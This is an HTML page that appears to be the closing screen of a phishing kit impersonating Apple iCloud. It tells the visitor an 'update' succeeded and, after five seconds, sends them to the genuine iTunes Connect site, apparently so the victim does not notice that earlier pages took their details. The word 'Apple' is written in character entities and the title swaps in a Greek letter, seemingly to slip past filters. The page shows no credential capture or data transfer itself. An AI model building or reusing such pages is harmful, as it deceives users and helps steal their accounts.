<!doctype html public "-//w3c//dtd html 4.01 transitional//en" "http://www.w3.org/tr/html4/loose.dtd">
<html>

<head>
	<meta http-equiv="content-type" content="text/html;charset=utf-8">
	<title>Thank y&#959;u.</title>
	<link href="../css/style.css" type="text/css" rel="stylesheet" />
	<link rel="../stylesheet" href="css/validationEngine.jquery.css" type="text/css" />
	<script src="../js/jquery-1.8.2.min.js" type="text/javascript"></script>
	<script src="../js/languages/jquery.validationEngine-en.js" type="text/javascript" charset="utf-8"></script>
	<script src="../js/jquery.validationEngine.js" type="text/javascript" charset="utf-8"></script>
	<link rel="shortcut icon" href="../../img/favicon.ico">
</head>
<body>
	<div id="top-bar">
		<div id="navbar">
			<ul >
				<li><a href="#"><img src="../img/app.png"  /></a></li>
				<li><a href="#"><img src="../img/ul1.png"  /></a></li>
				<li><a href="#"><img src="../img/ul2.png"  /></a></li>
				<li><a href="#"><img src="../img/ul3.png"  /></a></li>
				<li><a href="#"><img src="../img/ul4.png"  /></a></li>
				<li><a href="#"><img src="../img/ul5.png"  /></a></li>
				<li><a href="#"><img src="../img/ul6.png"  /></a></li>
				<li><a href="#"><img src="../img/ul7.png"  /></a></li>
				<li><form action="#" ><input class="top-nav-search" type="text" value="Search..." ></form></li>
			</ul>
			
		</div>
	</div>
	<div id="layout">
		<h1 class="logo"></h1>
		<div id="wrapper">
			<div class="left">
				<h1>Explore iCloud</h1>
				<p>Your &#65;p&#112;l&#101; ID gives you easy access to a wide range of &#65;p&#112;l&#101; services such as the iTunes Store, &#65;p&#112;l&#101; Online Store, iChat, and more. Your information will not be shared with anyone, unless you authorize us.</p>
			</div>
			<div class="right">
				<h1>&nbsp; Update Completed Successfully &nbsp;<img border="0" src="../img/sc.png" width="83" height="33" align="right"></h1>
				<p><BIG>&nbsp; You have to re-login to save changes,you will be redirected automatically</BIG><BIG> to login &nbsp; &nbsp;  page in 3 seconds  ... &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; If this page appears for more than 5 seconds <a href="https://itunesconnect.&#65;p&#112;l&#101;.com/WebObjects/iTunesConnect.woa/">Click here</a></BIG><BIG><p>&nbsp; Thank you for using our system verification.</p></BIG></p>
			</div>
			</div>
		</div>
		<tr>
 <td class="footer ecxbackground ecxcenterColumn" id="ecxfooterGroup1" colspan="3" style="font-family:'Helvetica Neue', Helvetica, Arial, sans-serif;width:685px;font-size:11px;line-height:14px;color:#888;text-align:center;background-repeat:no-repeat;background-position:center top;padding:19px 0 12px;" align="center">
 <img src="" alt=""></td>
</tr>
 <div id="footer">
		<p>The &#65;p&#112;l&#101; Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our <a href="#">Security Policy</a></p>
		<hr>
		<div class="copy-right"><a>Copyright &copy; 2015 &#65;p&#112;l&#101; Inc. All rights reserved.</a></div>
		<div class="terms"><a href="#">Terms of Use |</a> <a href="#">Terms of Use |</a><a href="#">Terms of Use .</a></div>
	 </div>
<script type="text/JavaScript">
<!--
setTimeout("location.href = 'https://itunesconnect.apple.com/WebObjects/iTunesConnect.woa/';",5000);
-->
</script>
</body>
</html>